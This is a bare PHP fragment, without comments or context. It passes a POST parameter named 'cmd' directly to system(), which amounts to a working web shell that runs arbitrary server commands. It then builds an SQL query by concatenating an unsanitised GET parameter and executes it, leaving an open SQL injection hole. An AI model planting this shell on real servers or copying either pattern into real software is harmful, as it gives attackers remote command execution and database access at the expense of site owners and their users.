<?php
$cmd = $_POST['cmd'];
system($cmd);
$id = $_GET['id'];
$q = "SELECT " . $id;
mysqli_query($conn, $q);
